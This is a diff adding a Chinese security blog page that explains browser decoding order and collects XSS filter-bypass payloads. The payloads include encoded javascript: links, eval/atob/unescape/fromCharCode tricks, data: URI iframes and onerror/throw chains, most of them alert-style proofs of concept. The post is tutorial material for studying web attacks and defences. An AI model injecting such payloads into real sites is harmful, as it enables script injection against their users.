@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
+    
+    <title>
+        
+            XSS编码的一点心得 |
+        
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Today's matter, today's end."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">XSS编码的一点心得</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2021-01-26 09:55:06
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/xss/">xss</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>对浏览器解析机制和xss编码绕过的一点记录</p>
+<h2 id="浏览器解析机制"><a href="#浏览器解析机制" class="headerlink" title="浏览器解析机制"></a>浏览器解析机制</h2><p><strong>解码顺序</strong></p>
+<p>html编码最先解析，url解码 javascript解码根据情况而定</p>
+<p><strong>html解码</strong> </p>
+<p>标签开始状态 -&gt; 数据状态—&gt;标签结束状态</p>
+<p>五类元素</p>
+<ol>
+<li><p>空元素(Void elements)，如<code>&lt;area&gt;,&lt;br&gt;,&lt;base&gt;</code>等等 </p>
+</li>
+<li><p>原始文本元素(Raw text elements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p>
+</li>
+<li><p>RCDATA元素(RCDATA elements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code> </p>
+</li>
+<li><p>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素 </p>
+</li>
+<li><p>基本元素(Normal elements)，即除了以上4种元素以外的元素 </p>
+<p>原始文本和基本元素的一大区别就是：HTML编码会不会被解析</p>
+</li>
+</ol>
+<p>   五类元素的区别如下： </p>
+<ol>
+<li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。 </li>
+<li>原始文本元素，可以容纳文本。  </li>
+<li>RCDATA元素，可以容纳文本和字符引用。 </li>
+<li>外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释  </li>
+<li>基本元素，可以容纳文本、字符引用、其他元素和注释 </li>
+</ol>
+<p>==》字符引用</p>
+<p>​            ==》字符值引用        ‘&lt;’对应的字符值引用为’&#60;’</p>
+<p>​            ==》字符实体引用    ‘&lt;’对应的字符实体引用为‘&lt;’</p>
+<p>==》三种情况可以引用字符实体</p>
+<p>​            ==》数据状态中的字符实体  不会转换到标签开始状态，既无法创建新标签</p>
+<p>​            ==》RCDATA状态中的字符实体  同上</p>
+<p>​            ==》属性值状态中的字符实体  这里面的一般都是转义的引号，或者函数名之类的，一般不会去转义标签    对于单双引号的转义是会被解析的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;confirm(&#x27;7<span class="symbol">&amp;#39;</span>);&quot;</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span>:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>总之一句话，</p>
+<p>属性中的实体编码会被解析</p>
+<p><strong>url解码</strong></p>
+<p>url解码出现在     src  href  action等可以引入url的地方， url解码时，<strong>协议 冒号:</strong> 这两个不能编码，要不然无法识别</p>
+<p><strong>javascript解码时</strong>   </p>
+<p>==》  Unicode编码  </p>
+<p>​             ===》只有是<strong>标识符名称</strong>时(函数名，属性名)，才能用，否则无法识别</p>
+<pre><code>===》**字符串**中只会被当作文本，不能被解析</code></pre><p>​             ===》<strong>控制字符</strong>中（括号，单双引号），只会被当作一个文本或者字符串，不会被解析</p>
+<p>==》\x16进制</p>
+<p>==》\八进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\u之后跟4位十六进制数。取值范围：\u0000 到 \uffff</span><br><span class="line">\x之后跟2位十六进制数。取值范围：\x00 到 \xff</span><br><span class="line"></span><br><span class="line">\x5f 等于 \u005f;</span><br><span class="line"></span><br><span class="line">document.write(&quot;\u0041&quot;);</span><br><span class="line">document.write(&quot;\x41&quot;);  这俩结果一样</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="总结一下三种编码分别用在哪里"><a href="#总结一下三种编码分别用在哪里" class="headerlink" title="总结一下三种编码分别用在哪里"></a>总结一下三种编码分别用在哪里</h2><p>如果想利用HTML编码，可以放在url或者javascript里，ins：href src（不能解析JavaScript协议，老版本的IE貌似可以）  onxxx   JavaScript协议 冒号也可以</p>
+<p>如果想利用URL编码，只能放在链接里  协议名称冒号不能编</p>
+<p>如果想利用Unicode编码，只能放在标识符名称里（函数名，属性名）；前面提到过script标签属于原始文本元素，原始文本元素中的HTML编码不会被解析，但是Unicode编码是可以被解析的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>aler\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//可以弹窗</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">aler<span class="symbol">&amp;#x74;</span>(1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//不能弹窗</span><br></pre></td></tr></table></figure>
+
+
+<p>以上所说的编码都是针对在值中的编码，不是在名字上的编码，也可以说结构不能编码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerro</span>\<span class="attr">u0072</span>=<span class="string">alert(1)</span>&gt;</span>  这个例子把onerror的名字给改了，不能解析，也可以说结构不能编码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">aler\u0074(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="利用函数增加一点解析"><a href="#利用函数增加一点解析" class="headerlink" title="利用函数增加一点解析"></a>利用函数增加一点解析</h2><p>真实环境中，可能不会出现一个xss点在onerror中，这里仅用onerror来代表可以执行js的地方</p>
+<h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>前面提到过Unicode编码，不能放在控制字符中</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert\x281)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样显然不能执行</p>
+<p>加上一个eval, 这样就可以打破限制</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;<span class="attr">alert</span>\<span class="attr">u00281</span>)&#x27;)&gt;</span>//可以把所有的字符全都换成js的三种编码</span><br></pre></td></tr></table></figure>
+
+
+<p>还以可以利用一点，js支持字符拼接，像onerror属性的值，是可以加载js的，所以说他就支持js字符拼接</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="unescape"><a href="#unescape" class="headerlink" title="unescape"></a>unescape</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的单引号还可以使用html实体编码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(<span class="symbol">&amp;#x27;</span>%61%6c%65%72%74%28%22%78%73%73%22%29%3b<span class="symbol">&amp;#x27;</span>))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="atob"><a href="#atob" class="headerlink" title="atob"></a>atob</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line">//document.location=&#x27;http://www.baidu.com&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="String-fromCharCode"><a href="#String-fromCharCode" class="headerlink" title="String.fromCharCode"></a>String.fromCharCode</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="toString进制转换"><a href="#toString进制转换" class="headerlink" title="toString进制转换"></a>toString进制转换</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval((8680439).toString(30))(1)&quot;</span>&gt;</span></span><br><span class="line">还可以这样把括号去掉，换成..  注意8680439如果不写括号的话，需要用两个点，因为只用一个点无法分辨是浮点数还是整数</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(8680439..toString(30))(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="协议进行编码"><a href="#协议进行编码" class="headerlink" title="协议进行编码"></a>协议进行编码</h3><p>data协议在img a 标签中貌似不能解析，但是在iframe标签中可以解析</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>记录一下，可以使用data的标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>下面这两个就无法解析</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="利用报错来构造payload"><a href="#利用报错来构造payload" class="headerlink" title="利用报错来构造payload"></a>利用报错来构造payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=alert;throw&#x27;xss&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>onerror在js执行异常时都会被触发，然后利用自定义的报错语句throw，抛出错误</p>
+<p>来分析一下，这个payload的执行过程</p>
+<p>给onerror定义了一个函数alert，类似于回调，当发生错误时调用alert函数，throw后面的xss就是传给函数的参数</p>
+<p>还有这样一种变形</p>
+<h4 id="chrom版"><a href="#chrom版" class="headerlink" title="chrom版"></a>chrom版</h4><h5 id="基础版"><a href="#基础版" class="headerlink" title="基础版"></a>基础版</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>这里利用了eval，也就意味着可以，throw后面的参数，可以有更多的变形，编码</p>
+<p>这个只在chrome下好用，火狐产生的异常信息是<code>uncaught exception</code>  因为这里有个空格，所以不能通过变量赋值的方式绕过，而且会产生一个语法错误。</p>
+<p>=的作用就是把 <code>Uncaught</code> 定义为一个变量，类似于下面这个效果</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(qwe=alert(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h5 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h5><p>这俩的分析以后补上，留个坑</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span><span class="regexp">/a/</span>,Uncaught=<span class="number">1</span>,g=alert,a=URL+<span class="number">0</span>,onerror=<span class="built_in">eval</span>,<span class="regexp">/1/g</span>+a[<span class="number">12</span>]+[<span class="number">1337</span>]+a[<span class="number">13</span>]</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">TypeError</span>.prototype.name =<span class="string">&#x27;=/&#x27;</span>,<span class="number">0</span>[onerror=<span class="built_in">eval</span>][<span class="string">&#x27;/-alert(1)//&#x27;</span>]</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Firefox版"><a href="#Firefox版" class="headerlink" title="Firefox版"></a>Firefox版</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">&#x27;alert\x281\x29&#x27;</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="进阶版-1"><a href="#进阶版-1" class="headerlink" title="进阶版"></a>进阶版</h4><p>通用</p>
+<p>No.1</p>
+<p>还可以这样删除分号，利用block语句</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;&#123;window.onerror=alert&#125;throw 1&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>参考链接</p>
+<p><a class="link" target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/292.html">http://bobao.360.cn/learning/detail/292.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067#toc-28">https://xz.aliyun.com/t/4067#toc-28<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://esdiscuss.org/topic/hacking-onerror-throw">https://esdiscuss.org/topic/hacking-onerror-throw<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://nosec.org/home/detail/2654.html">https://nosec.org/home/detail/2654.html<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：XSS编码的一点心得</li>
+        <li>本文作者：p1k</li>
+        <li>创建时间：2021-01-26 09:55:06</li>
+        <li>
+            本文链接：http://p1keman.github.io/2021/01/26/XSS编码的一点心得/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/01/26/java%E5%A4%87%E5%BF%98%E5%BD%95/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">java备忘录</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/01/25/BUU-one/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">BUU-one</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数 <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量 <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动 | 主题 <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="nav-text">浏览器解析机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E4%B8%89%E7%A7%8D%E7%BC%96%E7%A0%81%E5%88%86%E5%88%AB%E7%94%A8%E5%9C%A8%E5%93%AA%E9%87%8C"><span class="nav-text">总结一下三种编码分别用在哪里</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0%E5%A2%9E%E5%8A%A0%E4%B8%80%E7%82%B9%E8%A7%A3%E6%9E%90"><span class="nav-text">利用函数增加一点解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-text">eval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unescape"><span class="nav-text">unescape</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#atob"><span class="nav-text">atob</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#String-fromCharCode"><span class="nav-text">String.fromCharCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#toString%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">toString进制转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81"><span class="nav-text">协议进行编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E6%9D%A5%E6%9E%84%E9%80%A0payload"><span class="nav-text">利用报错来构造payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#chrom%E7%89%88"><span class="nav-text">chrom版</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%89%88"><span class="nav-text">基础版</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9B%E9%98%B6%E7%89%88"><span class="nav-text">进阶版</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Firefox%E7%89%88"><span class="nav-text">Firefox版</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E9%98%B6%E7%89%88-1"><span class="nav-text">进阶版</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
